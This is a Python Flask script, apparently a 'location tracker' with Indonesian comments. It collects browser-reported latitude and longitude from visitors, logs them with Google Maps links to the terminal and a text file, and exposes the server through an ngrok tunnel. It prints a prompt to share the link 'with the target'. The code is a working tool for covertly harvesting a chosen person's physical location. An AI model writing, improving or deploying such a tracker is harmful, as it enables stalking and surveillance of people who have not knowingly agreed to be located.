from flask import Flask, render_template, request, jsonify
from datetime import datetime
import os
import threading
import time

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    # Waktu saat lokasi diterima
    waktu = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Buat link Google Maps
    google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"

    # Tampilkan di terminal
    print("\n" + "="*50)
    print(f"[{waktu}] LOKASI DITERIMA")
    print(f"Latitude  : {latitude}")
    print(f"Longitude : {longitude}")
    print(f"Google Maps: {google_maps_link}")
    print("="*50 + "\n")

    # Simpan ke file lokasi.txt
    with open('lokasi.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{waktu}]\n")
        f.write(f"Latitude: {latitude}\n")
        f.write(f"Longitude: {longitude}\n")
        f.write(f"Google Maps: {google_maps_link}\n")
        f.write("-" * 40 + "\n")

    return jsonify({
        'status': 'success',
        'message': 'Lokasi berhasil diterima',
        'google_maps': google_maps_link,
        'waktu': waktu
    })

def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

if __name__ == '__main__':
    print("\n" + "="*50)
    print("    LOCATION TRACKER - Memulai Server...")
    print("="*50 + "\n")

    # Jalankan Flask di thread terpisah
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # Tunggu Flask siap
    time.sleep(2)

    # Jalankan ngrok
    try:
        from pyngrok import ngrok

        print("Membuat tunnel ngrok...")
        public_url = ngrok.connect(5000)
        print("\n" + "="*50)
        print("    SERVER BERJALAN!")
        print("="*50)
        print(f"\n🔗 Link publik: {public_url}")
        print("\n📋 Bagikan link ini ke target:")
        print(f"   {public_url}")
        print("\n⚠️  Tekan Ctrl+C untuk menghentikan server")
        print("="*50 + "\n")

        # Keep alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nMenghentikan server...")
            ngrok.kill()
            print("Server dihentikan.")

    except ImportError:
        print("\n❌ pyngrok belum terinstall!")
        print("Install dengan: pip install pyngrok")
        print("\nAtau jalankan manual:")
        print("  1. Jalankan: python app.py")
        print("  2. Buka terminal baru: ngrok http 5000")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        print("\nJalankan manual:")
        print("  1. Jalankan: python app.py")
        print("  2. Buka terminal baru: ngrok http 5000")